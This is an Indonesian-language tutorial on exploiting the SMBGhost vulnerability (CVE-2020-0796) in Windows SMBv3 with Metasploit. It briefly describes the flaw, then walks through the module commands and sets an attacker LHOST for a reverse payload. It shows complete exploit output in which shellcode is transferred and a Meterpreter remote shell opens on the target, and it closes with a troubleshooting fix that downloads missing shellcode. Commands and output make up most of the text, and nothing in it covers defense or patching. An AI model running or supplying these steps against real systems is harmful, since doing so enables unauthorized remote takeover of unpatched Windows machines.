# CVE-2020-0796

## A. Apa itu CVE-2020-0796?

[CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796), juga dikenal sebagai SMBGhost, adalah kerentanan Remote Code Execution (RCE) dalam `SMBv3` (Server Message Block versi 3) yang ditemukan pada Windows 10 dan Windows Server versi `1903` dan `1909`.

Kerentanan ini memungkinkan penyerang jarak jauh untuk mengeksekusi kode arbitrer pada sistem target hanya dengan mengirimkan paket `SMBv3` yang dibuat khusus. Dalam kondisi tertentu, kerentanan ini juga bisa dimanfaatkan untuk Local Privilege Escalation (LPE).

## B. Detail Teknis:
- CVE ID: `CVE-2020-0796`
- Tanggal Rilis: `10 Maret 2020`
- Tipe: Remote Code Execution (RCE) + Local Privilege Escalation (LPE)
- Protokol: `SMBv3`
- Komponen: `srv2.sys`
- Platform: `Windows 10` / `Server 1903` & `1909`
- Arsitektur: `x86` dan `x64`
- Skor CVSS: `10.0` (Kritis)

## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `CVE-2020-0796`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)

## D. Langkah Penggunaan di Metasploit:

1. Jalankan Metasploit:

   ```
   msfconsole
   ```

2. Gunakan Modul Exploit CVE-2020-0796:

   ```
   msf6 > use exploit/windows/smb/cve_2020_0796_smbghost
   ```

3. Setting Parameter Penting:

   ```
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set LHOST <IP_ATTACKER>
   msf6 > set LPORT <PORT_LISTENER>
   msf6 > set DefangedMode false
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```
   
4. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] Started reverse TCP handler on 192.168.1.42:4444 
   [*] 192.168.1.51:445 - Running automatic check ("set AutoCheck false" to disable)
   [!] 192.168.1.51:445 - The service is running, but could not be validated.
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000013000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000002000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000003000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000004000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000005000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000006000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000007000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000008000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000009000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000a000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000b000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000c000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000d000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000e000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000f000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000010000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000011000
   [*] 192.168.1.51:445 - Found low stub at physical address 0x0000000000011000, virtual address 0xfffff79e8000e000
   [*] 192.168.1.51:445 - Found PML4 at 0x00000000001aa000 (BIOS)
   [*] 192.168.1.51:445 - Found HAL heap at 0xfffff79e80000000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa200
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa400
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa600
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa800
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aaa00
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aac00
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aae00
   [*] 192.168.1.51:445 - Found PML4 self-reference entry at 0x01c9
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aaf78
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000041003d0
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004103000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004104000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001200
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001400
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001600
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001800
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001a00
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001c00
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001e00
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004104008
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000005200
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000005400
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000000054c0
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aaf80
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004308068
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004309210
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000255ebb0
   [*] 192.168.1.51:445 - Found hal!HalpInterruptController at 0xfffff79e80001448
   [*] 192.168.1.51:445 - Found hal!HalpApicRequestInterrupt at 0xfffff8034855ebb0
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aae48
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004100000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004101000
   [*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004102000
   [*] 192.168.1.51:445 - KUSER_SHARED_DATA PTE NX bit cleared!
   [*] 192.168.1.51:445 - Transferring 1274 bytes of shellcode...
   [*] 192.168.1.51:445 - Transfer complete, hooking hal!HalpApicRequestInterrupt to trigger execution...
   [*] Sending stage (203846 bytes) to 192.168.1.51
   [*] Meterpreter session 26 opened (192.168.1.42:4444 -> 192.168.1.51:49672) at 2025-05-14 22:17:01 +0700
   [*] 192.168.1.51:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
   [*] 192.168.1.51:445 - Cleaning up the contents of KUSER_SHARED_DATA...

   meterpreter > 
   ```

   Itu artinya kita sudah berhasil mengeksploitasi mesin terget.

## Tips Tambahan

Jika pada saat proses eksplotasi muncul error seperti ini:

```
[-] 192.168.1.51:445 - Exploit failed: Errno::ENOENT No such file or directory @ rb_sysopen - /usr/share/metasploit-framework/external/source/exploits/CVE-2020-0796/RCE/kernel_shellcode.asm
[*] 192.168.1.51:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
[*] 192.168.1.51:445 - Cleaning up the contents of KUSER_SHARED_DATA...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/cve_2020_0796_smbghost) >
```

Itu artinya file `kernel_shellcode.asm` tidak ada di direktori `/usr/share/metasploit-framework/external/source/exploits/CVE-2020-0796/RCE/`.

Untuk mengatasi error itu ketikkan perintah ini:

```
cd /usr/share/metasploit-framework
mkdir -p external/source/exploits/CVE-2020-0796/RCE/
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/refs/heads/master/external/source/exploits/CVE-2020-0796/RCE/kernel_shellcode.asm
```

Jika sudah jalankan exploit lagi:

```
exploit
```
